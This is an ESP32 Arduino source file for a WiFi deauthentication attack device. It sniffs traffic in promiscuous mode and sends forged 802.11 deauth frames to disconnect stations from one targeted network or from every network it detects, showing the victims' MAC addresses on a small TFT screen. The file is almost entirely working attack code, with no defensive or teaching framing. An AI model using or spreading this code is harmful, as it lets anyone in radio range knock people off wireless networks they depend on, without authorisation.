#include <WiFi.h>
#include <esp_wifi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>  // Include the TFT library
#include <SPI.h>  // Include SPI library
#include "types.h"
#include "deauth.h"
#include "definitions.h"
#include "web_interface.h"

// Define TFT pins
#define TFT_CS   5   // Chip Select pin (GPIO 5)
#define TFT_RST  4   // Reset pin (GPIO 4)
#define TFT_DC   2   // Data/Command pin (GPIO 2)

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);  // Initialize TFT screen

int curr_channel = 1;
wifi_promiscuous_filter_t filt;  // Declare the promiscuous filter
int deauth_type = DEAUTH_TYPE_ALL; // Define deauth type
deauth_frame_t deauth_frame;     // Declare deauth frame
int eliminated_stations = 0;     // Initialize eliminated stations count

void setup() {
  #ifdef SERIAL_DEBUG
    Serial.begin(115200);
  #endif

  #ifdef LED
    pinMode(LED, OUTPUT);
  #endif

  // Initialize WiFi
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  // Initialize TFT display
  tft.initR(INITR_18GREENTAB);  // Initialize 1.8" TFT screen
  tft.fillScreen(ST77XX_BLACK);  // Clear screen with black color
  tft.setTextColor(ST77XX_WHITE);  // Set text color to white
  tft.setTextSize(1);  // Set text size

  // Start the web interface
  start_web_interface();
}

void loop() {
  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);
  } else {
    // Handle web interface client
    web_interface_handle_client();
  }
}

void displayStatus(const char* status) {
  tft.setCursor(0, 0);          // Set cursor to top-left corner
  tft.setTextSize(1);           // Set text size
  tft.fillScreen(ST77XX_BLACK); // Clear screen with black
  tft.println("Status:");
  tft.setTextSize(2);
  tft.println(status);           // Display current status (e.g., "Deauth in Progress")
}

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  // Update TFT screen with information
  char status[50];
  snprintf(status, sizeof(status), "Deauthing: %02X:%02X:%02X:%02X:%02X:%02X", mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  displayStatus(status);

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);

    displayStatus("Deauth Attack Started");
  } else {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);

    displayStatus("Deauth Attack on All");
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
}
